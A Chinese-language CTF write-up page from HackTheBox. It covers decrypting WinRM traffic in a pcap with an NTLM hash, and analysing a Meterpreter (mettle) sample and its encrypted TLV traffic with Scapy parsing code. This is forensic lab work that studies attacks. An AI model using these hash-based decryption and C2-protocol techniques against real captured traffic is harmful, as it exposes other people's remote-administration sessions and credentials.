网上找到了一个据称可以解密winrm 流量的脚本，给出了密码的NTLM HASH，就现在来说，似乎很完美。然而，当试图运行脚本时，失败了。最终，问题似乎归结为未能将pcap捕获数据正确解析为字节。

 - [file-winrm_decrypt-py](https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045#file-winrm_decrypt-py)

后面对第208行进行调整，向其中添加了"include_raw=True, use_json=True"，以及第248行，其中"file_data = cap.http.file_data.binary_value"修改为"file_data = cap.http.file_data_raw[0].binary_value"。下面是修改后的版本的github仓库地址:

 - [decrypt-winrm](https://github.com/h4sh5/decrypt-winrm)

#### 解密winrm流量并获取最后的flag

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# python3 /root/decrypt-winrm/winrm_decrypt.py -n 8bb1f8635e5708eb95aedf142054fc95 capture.pcap
unwrap_initiate
No: 21358 | Time: 2021-11-05T07:04:51.144128 | Source: 192.168.1.9 | Destination: 192.168.1.10
<?xml version="1.0" ?>
<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config">
        <env:Header>
                <a:To>http://192.168.1.10:5985/wsman</a:To>
                <a:ReplyTo>
                        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>
                <a:MessageID>uuid:2E1BED84-B255-4285-9F46-23B3140DEC55</a:MessageID>
                <p:SessionId mustUnderstand="false">uuid:0203E06F-B136-4239-AC80-80F196C3E994</p:SessionId>
                <w:Locale xml:lang="en-US" mustUnderstand="false"/>
                <p:DataLocale xml:lang="en-US" mustUnderstand="false"/>
                <w:OperationTimeout>PT60S</w:OperationTimeout>
                <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/config</w:ResourceURI>
                <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Get</a:Action>
        </env:Header>
        <env:Body/>
</env:Envelope>


unwrap_accept
No: 21360 | Time: 2021-11-05T07:04:51.150923 | Source: 192.168.1.10 | Destination: 192.168.1.9
<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xml:lang="en-US">
        <s:Header>
                <a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/GetResponse</a:Action>
                <a:MessageID>uuid:7201F456-9480-4BDD-9CDE-993F1B5397D0</a:MessageID>
                <a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To>
                <a:RelatesTo>uuid:2E1BED84-B255-4285-9F46-23B3140DEC55</a:RelatesTo>
        </s:Header>
        <s:Body>
                <cfg:Config xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config">
                        <cfg:MaxEnvelopeSizekb>500</cfg:MaxEnvelopeSizekb>
                        <cfg:MaxTimeoutms>60000</cfg:MaxTimeoutms>
                        <cfg:MaxBatchItems>32000</cfg:MaxBatchItems>
                        <cfg:MaxProviderRequests>4294967295</cfg:MaxProviderRequests>
                        <cfg:Client>
                                <cfg:NetworkDelayms>5000</cfg:NetworkDelayms>
                                <cfg:URLPrefix>wsman</cfg:URLPrefix>
                                <cfg:AllowUnencrypted>false</cfg:AllowUnencrypted>
                                <cfg:Auth>
                                        <cfg:Basic>true</cfg:Basic>
                                        <cfg:Digest>true</cfg:Digest>
                                        <cfg:Kerberos>true</cfg:Kerberos>
                                        <cfg:Negotiate>true</cfg:Negotiate>
                                        <cfg:Certificate>true</cfg:Certificate>
                                        <cfg:CredSSP>false</cfg:CredSSP>
                                </cfg:Auth>
                                <cfg:DefaultPorts>
                                        <cfg:HTTP>5985</cfg:HTTP>
                                        <cfg:HTTPS>5986</cfg:HTTPS>
                                </cfg:DefaultPorts>
                                <cfg:TrustedHosts/>
                        </cfg:Client>
                        <cfg:Service>
                                <cfg:RootSDDL>O:NSG:BAD:P(A;;GA;;;BA)(A;;GR;;;IU)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)</cfg:RootSDDL>
                                <cfg:MaxConcurrentOperations>4294967295</cfg:MaxConcurrentOperations>
                                <cfg:MaxConcurrentOperationsPerUser>1500</cfg:MaxConcurrentOperationsPerUser>
                                <cfg:EnumerationTimeoutms>240000</cfg:EnumerationTimeoutms>
                                <cfg:MaxConnections>300</cfg:MaxConnections>
                                <cfg:MaxPacketRetrievalTimeSeconds>120</cfg:MaxPacketRetrievalTimeSeconds>
                                <cfg:AllowUnencrypted>false</cfg:AllowUnencrypted>
                                <cfg:Auth>
                                        <cfg:Basic>false</cfg:Basic>
                                        <cfg:Kerberos>true</cfg:Kerberos>
                                        <cfg:Negotiate>true</cfg:Negotiate>
                                        <cfg:Certificate>false</cfg:Certificate>
                                        <cfg:CredSSP>false</cfg:CredSSP>
                                        <cfg:CbtHardeningLevel>Relaxed</cfg:CbtHardeningLevel>
                                </cfg:Auth>
                                <cfg:DefaultPorts>
                                        <cfg:HTTP>5985</cfg:HTTP>
                                        <cfg:HTTPS>5986</cfg:HTTPS>
                                </cfg:DefaultPorts>
                                <cfg:IPv4Filter>*</cfg:IPv4Filter>
                                <cfg:IPv6Filter>*</cfg:IPv6Filter>
                                <cfg:EnableCompatibilityHttpListener>false</cfg:EnableCompatibilityHttpListener>
                                <cfg:EnableCompatibilityHttpsListener>false</cfg:EnableCompatibilityHttpsListener>
                                <cfg:CertificateThumbprint/>
                                <cfg:AllowRemoteAccess>true</cfg:AllowRemoteAccess>
                        </cfg:Service>
                        <cfg:Winrs>
                                <cfg:AllowRemoteShellAccess>true</cfg:AllowRemoteShellAccess>
                                <cfg:IdleTimeout>7200000</cfg:IdleTimeout>
                                <cfg:MaxConcurrentUsers>2147483647</cfg:MaxConcurrentUsers>
                                <cfg:MaxShellRunTime>2147483647</cfg:MaxShellRunTime>
                                <cfg:MaxProcessesPerShell>2147483647</cfg:MaxProcessesPerShell>
                                <cfg:MaxMemoryPerShellMB>2147483647</cfg:MaxMemoryPerShellMB>
                                <cfg:MaxShellsPerUser>2147483647</cfg:MaxShellsPerUser>
                        </cfg:Winrs>
                </cfg:Config>
        </s:Body>
</s:Envelope>

......more......
```

获取最终flag，winrm流量解密成功：

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# echo "aHTB{" | base64                                                                                     
YUhUQnsK
                                                                                                                                          
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# python3 /root/decrypt-winrm/winrm_decrypt.py -n 8bb1f8635e5708eb95aedf142054fc95 capture.pcap | grep hUQn    
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
                        <rsp:Stream Name="stdout" CommandId="8937D38B-70EB-44FB-84C5-DB5752DA7E67">AAAAAAAAABoAAAAAAAAAAAMAAABeAQAAAAQQBACzrAetdF3OT7duxmQ4O6Yxi9M3ietw+0SExdtXUtp+Z++7vzxTPkhUQntuMHRoMW5nXzFzX3RydTNfM3Yzcnl0aDFuZ18xc19kM2NyeXB0M2R9PC9TPg==</rsp:Stream>
unwrap_initiate
unwrap_accept
unwrap_initiate
unwrap_accept
unwrap_initiate
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# echo AAAAAAAAABoAAAAAAAAAAAMAAABeAQAAAAQQBACzrAetdF3OT7duxmQ4O6Yxi9M3ietw+0SExdtXUtp+Z++7vzxTPkhUQntuMHRoMW5nXzFzX3RydTNfM3Yzcnl0aDFuZ18xc19kM2NyeXB0M2R9PC9TPg== | base64 -d
▒^���t]�O�n�d8;�1��7��p�D���WR�~g<S>HTB{n0th1ng_1s_tru3_3v3ryth1ng_1s_d3crypt3d}</S>
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic8.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic9.png)

<!-- kb:end decrypt-winrm-traffic -->

</details>

<a id="case-msf-meterpreter-traffic-decrypt"></a>

## Meterpreter TLV 与破损 RSA 材料

分析拆开 XOR 头部与加密 TLV，借助内存确认 AES 密钥；另一分支从残缺 Base64 和 RSA 参数恢复私钥。两个过程的解析脚本完整保留。

<p class="kb-provenance">来源 msf-meterpreter-traffic-decrypt · 原记录 2023-02-07 · 46 个代码块 · 11 处图片引用</p>

<details class="kb-evidence" id="record-msf-meterpreter-traffic-decrypt">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start msf-meterpreter-traffic-decrypt -->

#### 简述

这两个部分是insane难度的HTB Response机器的root部分，其中msf meterpreter流量解密是此box的特色，和最难的部分，为了blog美观。所以顺带把破碎ssh key 复原的部分也加进来了，主要参考[HTB response writeup from 0xdf's blog](https://0xdf.gitlab.io/2023/02/04/htb-response.html)记录这篇博客加深记忆和理解，及供后续时间充足在做深入研究查阅，备忘。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response.png)



#### Msf Meterpreter 流量解密
#### incident_2020-3-042

通过之前的渗透以scryh用户登录ssh之后，现在可以访问incident_2020-3-042文件夹。它有三个文件:

``` bash
scryh@response:~/incident_2022-3-042$ file *
core.auto_update: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './auto_update', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: './auto_update', platform: 'x86_64'
dump.pcap:        pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
IR_report.pdf:    PDF document, version 1.4
```

一个core dump，一个PCAP和一个PDF。用scp抓取这三个文件到本地

``` bash
scp -i scryh_id_rsa scryh@response.htb:~/incident_2022-3-042/* .
```

IR_report.pdf 是一个事件的单页摘要:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response1.png)

看起来像是有人访问了聊天应用程序，让管理员下载了一个链接并执行meterpreter payload，导出了一个zip存档。core dump中有恶意软件被kill之前的内存，而PCAP包中有记录网络流量。

#### dump.pcap

通过分析pcap流量包，发现在(TCP stream 96) 一个ELF文件auto_update从攻击者方被下载:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response2.png)

下一个流量(97)是返回到攻击者4444上的连接，该连接是加密的。

#### Binary分析

通过"导出对象" > “HTTP…”从Wireshark下载一份ELF的副本:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response3.png)

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response]
└─# file auto_update    
auto_update: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped
                                                                                                                                                    
┌──(root💀kali)-[~/hackthebox/machine/response]
└─# strings -n 10 auto_update
...snip...
  -u, --uri <uri>        add connection URI
  -U, --uuid <uuid>      set the UUID (base64)
  -d, --debug <level>    enable debug output (set to 0 to disable)
  -o, --out <file>       write debug output to a file
  -b, --background <0|1> start as a background service (0 disable, 1 enable)
  -p, --persist [none|install|uninstall] manage persistence
  -m, --modules <path>   add modules from path
  -n, --name <name>      name to start as
  -l, --listen
  -c, --console
hu:U:G:d:o:b:p:n:lcm:
using name: %s
/mettle/mettle/src/main.c
session-guid
background
default_opts
could not initialize
/mettle/mettle/src/mettle.c
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/://
?application/octet-stream
Connection: close
/mettle/mettle/src/c2_http.c
referer: %s
cookie: %s
header: %s
?channel-req-%d
could not find handlers for channel type %s
/mettle/mettle/src/channel.c
No extension received
/mettle/mettle/src/coreapi.c
No extension name specified
Loading extension '%s' from binary image
Failed to allocate memory for '%s' binary image
...snip...
```

帮助菜单很有趣，但出现了几次的术语"mettle"也很有趣。[Mettle](https://github.com/rapid7/mettle)是Meterpreter的一部分，具体来说:

***这是native-code Meterpreter的实现，设计用于可移植性、可嵌入性和低资源利用率。它可以运行在最小的嵌入式Linux上，目标是大铁，目标是Android、iOS、macOS、Linux和Windows，但可以移植到几乎任何posix兼容的环境。***

在[VirusTotal](https://www.virustotal.com/gui/file/aff947cea72ab6296416080041753af79fa0684e3621281f537ce5f046db39d3)中搜索哈希显示这个ELF已经上传，签名显示它是Meterpreter:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response4.png)

#### Meterpreter 数据包结构

找到一些关于meterpreter在wire上使用的协议的资料。它是一种[type-length-value协议](https://en.wikipedia.org/wiki/Type%E2%80%93length%E2%80%93value)(实际上更像LTV)，有一个header，数据包是加密的，还有一个IV。

 - [This pull request](https://github.com/rapid7/metasploit-framework/pull/8625)讨论了2017年协议的变化，并对"新"(当前)版本进行了一些不错的描述。
 - [This documentation from Rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Packet)的文档显示了数据包对象及其字段。

每个数据包以一个应用于数据包其余部分的四字节XOR键开始。header的其余部分是session GUID，加密标志，数据包长度和数据包类型:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response5.png)

数据包长度是指从起始点到结束点的长度。

如果报文没有加密，则启动TLV报文。如果它是加密的，剩下的包有一个16字节的AES IV，一旦解密，结果就是TLV包。

#### Video

推荐观看0xdf的youtube视频[Decrypting Meterpreter Traffic in PCAP (with coredump)](https://youtu.be/-RlZCTYcgvk)，解密python脚本写的很丝滑

#### 解析外层数据流

使用tshark将meterpreter TCP流量拉到文件msf.pcap中:

``` bash
tshark -q -r dump.pcap -Y tcp.stream==97 -w msf.pcap
```

现在使用Python / Scapy来解析pcap。从数据流的角度来考虑，而不是数据包，所以将从将所有数据放入一个流开始。这里有一些风险，将攻击者和受害者的流量结合在一起。

``` python
# pull all bytes into a stream
pcap = rdpcap("./msf.pcap")
stream = b"".join([bytes(packet[TCP].payload) for packet in pcap if TCP in packet])
```

现在我将从0开始处理数据流。需要一个快速XOR的函数，以及一个字典来跟踪加密类型:

``` bash
enc_types = {0: "None", 1: "AES256", 2: "AES128"}

def xor(buf, key):
    return bytes([x ^ key[i % len(key)] for i, x in enumerate(buf)])
```

现在循环，将前32个字节作为头文件，并解析它:

``` bash
i = 0
while i < len(stream):
    xor_head = stream[i:i+32]
    xor_key = xor_head[:4]
    head = xor(xor_head, xor_key)
    session_guid = head[4:20]
    enc_flag = int.from_bytes(head[20:24], "big")
    packet_len = int.from_bytes(head[24:28], "big")
    packet_type = int.from_bytes(head[28:32], "big")

    print(f"Packet: type={packet_type:<4} len={packet_len:<8} enc={enc_types[enc_flag]} sess={uuid.UUID(bytes=session_guid)}")
    i += 24 + packet_len
```

我将获得XOR key，然后将其应用到整个头部。然后我可以获得会话、加密标志、数据包长度和类型。打印这些，看看它们是否有意义:

``` bash
kali@hacky# python -i parse_msf.py 
Packet: type=0    len=363      enc=None sess=00000000-0000-0000-0000-000000000000
Packet: type=1    len=373      enc=None sess=00000000-0000-0000-0000-000000000000
Packet: type=0    len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=1    len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=0    len=104      enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=1    len=120      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
Packet: type=0    len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
Packet: type=1    len=648      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
Packet: type=0    len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
...[snip]...
```

它开始时没有session id，也没有加密，然后开始加密，然后生成session id。类型0看起来像是攻击者传给受害者的数据，而类型1看起来像是受害者传给攻击者的数据。这与[mettle source](https://github.com/rapid7/mettle/blob/52de3c892701e0101746b46ee8b47b76cde8d2d4/mettle/src/tlv_types.h#L10-L11)中的常数相匹配:

``` bash
#define TLV_PACKET_TYPE_REQUEST  0
#define TLV_PACKET_TYPE_RESPONSE 1
```

在脚本顶部添加 packet_types = {0: "Req"， 1: "Resp"}，并将输出更改为显示字符串名称而不是数字。

#### 解析未加密的TLVs数据流

在前面的步骤中，跳过数据包中的所有数据。要解析加密数据包，需要AES密钥。但现在可以处理未加密的数据包了。
在打印数据包信息之后，在I增加之前，将添加:

``` bash
...[snip]...
   print(f"Packet: type={packet_types[packet_type]:<4} len={packet_len:<8} enc={enc_types[enc_flag]} sess={uuid.UUID(bytes=session_guid)}")

    tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)
    if enc_flag == 1:
        aes_iv = tlv_data[:16]
        tlv_data = tlv_data[16:]
        # future decrypt here

    j = 0
    # skip encrypted for now
    while j < len(tlv_data) and enc_flag == 0:
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        t = int.from_bytes(tlv_data[j+4:j+8], 'big')
        v = tlv_data[j+8:j+l]
        print(f"TLV l={l:<8} t=0x{t:<6x} v={v if len(v) <= 26 else v[:26]}")
        j += l
    
    i += 24 + packet_len
```

这将获得TLV数据，并对其进行xor。然后，如果数据包是加密的，它pulls IV并向前移动。现在它会遍历数据，但如果数据被加密就会break。下面输出了前两个包发送的消息:

``` bash
kali@hacky$ python parse_msf.py 
Packet: type=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=0x20001  v=b'\x00\x00\x00\x10'
TLV l=41       t=0x10002  v=b'20785548998507895601672178'
TLV l=302      t=0x40226  v=b'0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82'
Packet: type=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=0x401cd  v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=0x20001  v=b'\x00\x00\x00\x10'
TLV l=41       t=0x10002  v=b'20785548998507895601672178'
TLV l=12       t=0x20004  v=b'\x00\x00\x00\x00'
TLV l=12       t=0x20227  v=b'\x00\x00\x00\x01'
TLV l=264      t=0x40229  v=b'-I\x1d\xc1\xa3YLu\xa9\x99/\x96>\xe9\x1f\x9c\xf9g~\x0fH8\xee\xe1y\xf1'
Packet: type=Req  len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=Resp len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000
...[snip]...
```

让它打印出前26个字节的数据，因为这可能会有一些启示，而且它适合我的屏幕。将根据需要进行更改，以查看更多或更少的数据。
这完全没有必要，但是想看看所有的TLV消息类型是什么。它们定义在与上面相同的[源代码tlv_type.h](https://github.com/rapid7/mettle/blob/52de3c892701e0101746b46ee8b47b76cde8d2d4/mettle/src/tlv_types.h#L49-L307)中:

``` bash
#define TLV_TYPE_ANY                   (TLV_META_TYPE_NONE    | 0)
#define TLV_TYPE_COMMAND_ID            (TLV_META_TYPE_UINT    | 1)
#define TLV_TYPE_REQUEST_ID            (TLV_META_TYPE_STRING  | 2)
#define TLV_TYPE_EXCEPTION             (TLV_META_TYPE_GROUP   | 3)
#define TLV_TYPE_RESULT                (TLV_META_TYPE_UINT    | 4)

#define TLV_TYPE_STRING                (TLV_META_TYPE_STRING  | 10)
#define TLV_TYPE_UINT                  (TLV_META_TYPE_UINT    | 11)
#define TLV_TYPE_BOOL                  (TLV_META_TYPE_BOOL    | 12)

#define TLV_TYPE_LENGTH                (TLV_META_TYPE_UINT    | 25)
#define TLV_TYPE_DATA                  (TLV_META_TYPE_RAW     | 26)
#define TLV_TYPE_FLAGS                 (TLV_META_TYPE_UINT    | 27)

#define TLV_TYPE_CHANNEL_ID            (TLV_META_TYPE_UINT    | 50)
#define TLV_TYPE_CHANNEL_TYPE          (TLV_META_TYPE_STRING  | 51)
#define TLV_TYPE_CHANNEL_DATA          (TLV_META_TYPE_RAW     | 52)
#define TLV_TYPE_CHANNEL_DATA_GROUP    (TLV_META_TYPE_GROUP   | 53)
#define TLV_TYPE_CHANNEL_CLASS         (TLV_META_TYPE_UINT    | 54)
#define TLV_TYPE_CHANNEL_PARENTID      (TLV_META_TYPE_UINT    | 55)

#define TLV_TYPE_SEEK_WHENCE           (TLV_META_TYPE_UINT    | 70)
#define TLV_TYPE_SEEK_OFFSET           (TLV_META_TYPE_UINT    | 71)
#define TLV_TYPE_SEEK_POS              (TLV_META_TYPE_UINT    | 72)

#define TLV_TYPE_EXCEPTION_CODE        (TLV_META_TYPE_UINT    | 300)
#define TLV_TYPE_EXCEPTION_STRING      (TLV_META_TYPE_STRING  | 301)

#define TLV_TYPE_LIBRARY_PATH          (TLV_META_TYPE_STRING  | 400)
#define TLV_TYPE_TARGET_PATH           (TLV_META_TYPE_STRING  | 401)
#define TLV_TYPE_MIGRATE_PID           (TLV_META_TYPE_UINT    | 402)
#define TLV_TYPE_MIGRATE_LEN           (TLV_META_TYPE_UINT    | 403)

#define TLV_TYPE_TRANS_TYPE            (TLV_META_TYPE_UINT    | 430)
#define TLV_TYPE_TRANS_URL             (TLV_META_TYPE_STRING  | 431)
#define TLV_TYPE_TRANS_UA              (TLV_META_TYPE_STRING  | 432)
#define TLV_TYPE_TRANS_COMM_TIMEOUT    (TLV_META_TYPE_UINT    | 433)
#define TLV_TYPE_TRANS_SESSION_EXP     (TLV_META_TYPE_UINT    | 434)
#define TLV_TYPE_TRANS_CERT_HASH       (TLV_META_TYPE_RAW     | 435)
#define TLV_TYPE_TRANS_PROXY_HOST      (TLV_META_TYPE_STRING  | 436)
#define TLV_TYPE_TRANS_PROXY_USER      (TLV_META_TYPE_STRING  | 437)
#define TLV_TYPE_TRANS_PROXY_PASS      (TLV_META_TYPE_STRING  | 438)
#define TLV_TYPE_TRANS_RETRY_TOTAL     (TLV_META_TYPE_UINT    | 439)
#define TLV_TYPE_TRANS_RETRY_WAIT      (TLV_META_TYPE_UINT    | 440)
#define TLV_TYPE_TRANS_GROUP           (TLV_META_TYPE_GROUP   | 441)

#define TLV_TYPE_MACHINE_ID            (TLV_META_TYPE_STRING  | 460)
#define TLV_TYPE_UUID                  (TLV_META_TYPE_RAW     | 461)
#define TLV_TYPE_SESSION_GUID          (TLV_META_TYPE_RAW     | 462)

#define TLV_TYPE_RSA_PUB_KEY           (TLV_META_TYPE_RAW     | 550)
#define TLV_TYPE_SYM_KEY_TYPE          (TLV_META_TYPE_UINT    | 551)
#define TLV_TYPE_SYM_KEY               (TLV_META_TYPE_RAW     | 552)
#define TLV_TYPE_ENC_SYM_KEY           (TLV_META_TYPE_RAW     | 553)

/*
 * General
 */
#define TLV_TYPE_HANDLE                (TLV_META_TYPE_QWORD   | 600)
#define TLV_TYPE_INHERIT               (TLV_META_TYPE_BOOL    | 601)
#define TLV_TYPE_PROCESS_HANDLE        (TLV_META_TYPE_QWORD   | 630)
#define TLV_TYPE_THREAD_HANDLE         (TLV_META_TYPE_QWORD   | 631)

/*
 * Fs
 */
#define TLV_TYPE_DIRECTORY_PATH        (TLV_META_TYPE_STRING  | 1200)
#define TLV_TYPE_FILE_NAME             (TLV_META_TYPE_STRING  | 1201)
#define TLV_TYPE_FILE_PATH             (TLV_META_TYPE_STRING  | 1202)
#define TLV_TYPE_FILE_MODE             (TLV_META_TYPE_STRING  | 1203)
#define TLV_TYPE_FILE_SIZE             (TLV_META_TYPE_UINT    | 1204)
#define TLV_TYPE_FILE_HASH             (TLV_META_TYPE_RAW     | 1206)

#define TLV_TYPE_STAT_BUF              (TLV_META_TYPE_COMPLEX | 1221)

#define TLV_TYPE_SEARCH_RECURSE        (TLV_META_TYPE_BOOL    | 1230)
#define TLV_TYPE_SEARCH_GLOB           (TLV_META_TYPE_STRING  | 1231)
#define TLV_TYPE_SEARCH_ROOT           (TLV_META_TYPE_STRING  | 1232)
#define TLV_TYPE_SEARCH_RESULTS        (TLV_META_TYPE_GROUP   | 1233)

#define TLV_TYPE_FILE_MODE_T           (TLV_META_TYPE_UINT    | 1234)
#define TLV_TYPE_SEARCH_MTIME          (TLV_META_TYPE_UINT    | 1235)
#define TLV_TYPE_SEARCH_M_START_DATE   (TLV_META_TYPE_UINT    | 1236)
#define TLV_TYPE_SEARCH_M_END_DATE     (TLV_META_TYPE_UINT    | 1237)

/*
 * Net
 */
#define TLV_TYPE_HOST_NAME             (TLV_META_TYPE_STRING  | 1400)
#define TLV_TYPE_PORT                  (TLV_META_TYPE_UINT    | 1401)
#define TLV_TYPE_INTERFACE_MTU         (TLV_META_TYPE_UINT    | 1402)
#define TLV_TYPE_INTERFACE_FLAGS       (TLV_META_TYPE_STRING  | 1403)
#define TLV_TYPE_INTERFACE_INDEX       (TLV_META_TYPE_UINT    | 1404)

#define TLV_TYPE_SUBNET                (TLV_META_TYPE_RAW     | 1420)
#define TLV_TYPE_NETMASK               (TLV_META_TYPE_RAW     | 1421)
#define TLV_TYPE_GATEWAY               (TLV_META_TYPE_RAW     | 1422)
#define TLV_TYPE_NETWORK_ROUTE         (TLV_META_TYPE_GROUP   | 1423)
#define TLV_TYPE_IP_PREFIX             (TLV_META_TYPE_UINT    | 1424)
#define TLV_TYPE_ARP_ENTRY             (TLV_META_TYPE_GROUP   | 1425)

#define TLV_TYPE_IP                    (TLV_META_TYPE_RAW     | 1430)
#define TLV_TYPE_MAC_ADDRESS           (TLV_META_TYPE_RAW     | 1431)
#define TLV_TYPE_MAC_NAME              (TLV_META_TYPE_STRING  | 1432)
#define TLV_TYPE_NETWORK_INTERFACE     (TLV_META_TYPE_GROUP   | 1433)
#define TLV_TYPE_IP6_SCOPE             (TLV_META_TYPE_RAW     | 1434)

#define TLV_TYPE_SUBNET_STRING         (TLV_META_TYPE_STRING  | 1440)
#define TLV_TYPE_NETMASK_STRING        (TLV_META_TYPE_STRING  | 1441)
#define TLV_TYPE_GATEWAY_STRING        (TLV_META_TYPE_STRING  | 1442)
#define TLV_TYPE_ROUTE_METRIC          (TLV_META_TYPE_UINT    | 1443)
#define TLV_TYPE_ADDR_TYPE             (TLV_META_TYPE_UINT    | 1444)

#define TLV_TYPE_PROXY_CFG_AUTODETECT    (TLV_META_TYPE_BOOL  | 1445)
#define TLV_TYPE_PROXY_CFG_AUTOCONFIGURL (TLV_META_TYPE_STRING| 1446)
#define TLV_TYPE_PROXY_CFG_PROXY         (TLV_META_TYPE_STRING| 1447)
#define TLV_TYPE_PROXY_CFG_PROXYBYPASS   (TLV_META_TYPE_STRING| 1448)

/*
 * Socket
 */
#define TLV_TYPE_PEER_HOST             (TLV_META_TYPE_STRING  | 1500)
#define TLV_TYPE_PEER_PORT             (TLV_META_TYPE_UINT    | 1501)
#define TLV_TYPE_LOCAL_HOST            (TLV_META_TYPE_STRING  | 1502)
#define TLV_TYPE_LOCAL_PORT            (TLV_META_TYPE_UINT    | 1503)
#define TLV_TYPE_CONNECT_RETRIES       (TLV_META_TYPE_UINT    | 1504)
#define TLV_TYPE_NETSTAT_ENTRY         (TLV_META_TYPE_GROUP   | 1505)
#define TLV_TYPE_PEER_HOST_RAW         (TLV_META_TYPE_RAW     | 1506)
#define TLV_TYPE_LOCAL_HOST_RAW        (TLV_META_TYPE_RAW     | 1507)

#define TLV_TYPE_SHUTDOWN_HOW          (TLV_META_TYPE_UINT    | 1530)

/*
 * Registry
 */
#define TLV_TYPE_HKEY                  (TLV_META_TYPE_QWORD   | 1000)
#define TLV_TYPE_ROOT_KEY              (TLV_TYPE_HKEY)
#define TLV_TYPE_BASE_KEY              (TLV_META_TYPE_STRING  | 1001)
#define TLV_TYPE_PERMISSION            (TLV_META_TYPE_UINT    | 1002)
#define TLV_TYPE_KEY_NAME              (TLV_META_TYPE_STRING  | 1003)
